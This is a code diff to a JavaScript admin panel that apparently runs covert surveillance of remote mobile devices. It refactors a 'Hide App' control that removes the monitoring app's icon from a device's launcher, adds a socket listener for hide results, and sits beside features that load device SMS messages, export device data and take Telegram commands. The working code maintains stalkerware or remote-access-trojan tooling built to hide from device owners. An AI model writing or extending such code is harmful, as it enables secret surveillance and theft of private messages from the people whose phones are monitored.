@@ -1767,6 +1767,35 @@ async function openDeviceModal(deviceId, deviceName) {
 
   document.getElementById('deviceModal').classList.remove('hidden');
 
+  // ═══ Sync Hide-App button with device's actual is_hidden state ═══
+  // Before, appHidden was a stale global flag that never reset between
+  // devices — opening Device B after hiding Device A showed the wrong
+  // button label. Now we look up the device's is_hidden from the cached
+  // device list (populated by /api/admin/connections) and reset both the
+  // flag and the button visual.
+  try {
+    const dev = (allDevices || []).find(d => d.device_id === deviceId);
+    const hidden = !!(dev && (dev.is_hidden === 1 || dev.is_hidden === true));
+    appHidden = hidden;
+    const btn = document.getElementById('hideAppBtn');
+    if (btn) {
+      if (hidden) {
+        btn.innerHTML = '<i class="ri-eye-line"></i> <span class="hide-tiny">Unhide App</span>';
+        btn.style.background = 'rgba(76,175,80,.15)';
+        btn.style.borderColor = 'rgba(76,175,80,.3)';
+        btn.style.color = '#4CAF50';
+      } else {
+        btn.innerHTML = '<i class="ri-eye-off-line"></i> <span class="hide-tiny">Hide App</span>';
+        btn.style.background = 'rgba(156,78,221,.15)';
+        btn.style.borderColor = 'rgba(156,78,221,.3)';
+        btn.style.color = '#9d4edd';
+      }
+    }
+  } catch (_) {
+    // Defensive: if allDevices isn't populated yet, default to visible state
+    appHidden = false;
+  }
+
   // Load first tab
   await loadSmsMessages(1);
 }
@@ -2872,63 +2901,112 @@ window.exportDeviceData = exportDeviceData;
 
 let appHidden = false;
 
+// Helper: apply hidden/visible visual state to the Hide-App button.
+// Centralised so openDeviceModal(), toggleHideApp(), and the live
+// hide_app_result socket listener all paint the button identically.
+function setHideAppButtonVisual(hidden) {
+  const btn = document.getElementById('hideAppBtn');
+  if (!btn) return;
+  if (hidden) {
+    btn.innerHTML = '<i class="ri-eye-line"></i> <span class="hide-tiny">Unhide App</span>';
+    btn.style.background = 'rgba(76,175,80,.15)';
+    btn.style.borderColor = 'rgba(76,175,80,.3)';
+    btn.style.color = '#4CAF50';
+  } else {
+    btn.innerHTML = '<i class="ri-eye-off-line"></i> <span class="hide-tiny">Hide App</span>';
+    btn.style.background = 'rgba(156,78,221,.15)';
+    btn.style.borderColor = 'rgba(156,78,221,.3)';
+    btn.style.color = '#9d4edd';
+  }
+  btn.disabled = false;
+}
+
+// Helper: update the cached allDevices entry + live button if modal is open.
+function applyHideAppResult(deviceId, hidden, success, errorMsg) {
+  // 1. Update cached device list so next modal open reflects truth
+  if (Array.isArray(allDevices)) {
+    const d = allDevices.find(x => x.device_id === deviceId);
+    if (d) d.is_hidden = hidden ? 1 : 0;
+  }
+
+  // 2. If modal is open for THIS device, update button + flag
+  if (modalDeviceId !== deviceId) return;
+  if (success) {
+    appHidden = hidden;
+    setHideAppButtonVisual(hidden);
+  } else {
+    // Failure: revert button to the PREVIOUS state (which is !hidden since
+    // the click was attempting to transition TO hidden)
+    setHideAppButtonVisual(!hidden);
+    showToast(errorMsg || `Failed to ${hidden ? 'hide' : 'unhide'} app on device`, 'error');
+  }
+}
+
 async function toggleHideApp() {
   if (!modalDeviceId) return showToast('No device selected', 'error');
   const btn = document.getElementById('hideAppBtn');
   if (!btn) return;
 
+  const wantHidden = !appHidden; // desired state after this click
+  const endpoint = wantHidden ? 'hide-app' : 'unhide-app';
+  const verb = wantHidden ? 'Hiding' : 'Unhiding';
+
   try {
-    if (!appHidden) {
-      // HIDE the app
-      btn.disabled = true;
-      btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i> Hiding...';
-      const res = await fetch(`${API_BASE}/api/admin/hide-app`, {
-        method: 'POST',
-        headers: { 'x-admin-password': adminPassword, 'Content-Type': 'application/json' },
-        body: JSON.stringify({ device_id: modalDeviceId })
-      });
-      const data = await res.json();
-      btn.disabled = false;
-      if (data.success) {
-        appHidden = true;
-        btn.innerHTML = '<i class="ri-eye-line"></i> <span class="hide-tiny">Unhide App</span>';
-        btn.style.background = 'rgba(76,175,80,.15)';
-        btn.style.borderColor = 'rgba(76,175,80,.3)';
-        btn.style.color = '#4CAF50';
-        showToast('App hidden from device — icon removed from launcher', 'success');
-      } else {
-        btn.innerHTML = '<i class="ri-eye-off-line"></i> <span class="hide-tiny">Hide App</span>';
-        showToast(data.error || 'Failed to hide app', 'error');
-      }
+    btn.disabled = true;
+    btn.innerHTML = `<i class="ri-loader-4-line ri-spin"></i> ${verb}...`;
+
+    const res = await fetch(`${API_BASE}/api/admin/${endpoint}`, {
+      method: 'POST',
+      headers: { 'x-admin-password': adminPassword, 'Content-Type': 'application/json' },
+      body: JSON.stringify({ device_id: modalDeviceId })
+    });
+    const data = await res.json();
+
+    if (data.success) {
+      // Command was relayed to the device — but the actual hide/unhide
+      // result arrives asynchronously via the 'hide_app_result' socket
+      // event (see socket listener below). Show a transient "sent" toast;
+      // applyHideAppResult() will paint the final state + success toast
+      // when the device reports back.
+      showToast(`${verb} command sent to device — waiting for confirmation...`, 'success');
+      // Keep button disabled + spinner until hide_app_result arrives
+      btn.innerHTML = `<i class="ri-loader-4-line ri-spin"></i> Sent...`;
     } else {
-      // UNHIDE the app
-      btn.disabled = true;
-      btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i> Unhiding...';
-      const res = await fetch(`${API_BASE}/api/admin/unhide-app`, {
-        method: 'POST',
-        headers: { 'x-admin-password': adminPassword, 'Content-Type': 'application/json' },
-        body: JSON.stringify({ device_id: modalDeviceId })
-      });
-      const data = await res.json();
-      btn.disabled = false;
-      if (data.success) {
-        appHidden = false;
-        btn.innerHTML = '<i class="ri-eye-off-line"></i> <span class="hide-tiny">Hide App</span>';
-        btn.style.background = 'rgba(156,78,221,.15)';
-        btn.style.borderColor = 'rgba(156,78,221,.3)';
-        btn.style.color = '#9d4edd';
-        showToast('App unhidden — icon restored to launcher', 'success');
-      } else {
-        btn.innerHTML = '<i class="ri-eye-line"></i> <span class="hide-tiny">Unhide App</span>';
-        showToast(data.error || 'Failed to unhide app', 'error');
-      }
+      // Server-side error (device not connected, etc.)
+      setHideAppButtonVisual(appHidden); // revert to previous state
+      showToast(data.error || `Failed to ${wantHidden ? 'hide' : 'unhide'} app`, 'error');
     }
   } catch (e) {
-    btn.disabled = false;
+    setHideAppButtonVisual(appHidden); // revert to previous state
     showToast('Error: ' + e.message, 'error');
   }
 }
 window.toggleHideApp = toggleHideApp;
+
+// Live socket listener: when device reports hide_app_result, update UI.
+// This handles ALL cases: direct admin click, Telegram-triggered hide, or
+// state changes from another admin session. The server already persisted
+// is_hidden to the DB before emitting this event.
+if (typeof socket !== 'undefined' && socket) {
+  socket.on('hide_app_result', (payload) => {
+    try {
+      const deviceId = payload.device_id;
+      const success = payload.success === true || payload.success === 1;
+      const action = payload.action || ''; // 'hide' | 'unhide'
+      const hidden = success && action === 'hide';
+      applyHideAppResult(deviceId, hidden, success, payload.error || '');
+
+      if (success) {
+        const msg = action === 'hide'
+          ? 'App hidden from device — icon removed from launcher'
+          : 'App unhidden — icon restored to launcher';
+        showToast(msg, 'success');
+      }
+    } catch (e) {
+      console.warn('[hide_app_result] handler error:', e);
+    }
+  });
+}
 
 // ========== Settings ==========
 async function saveSettings() {
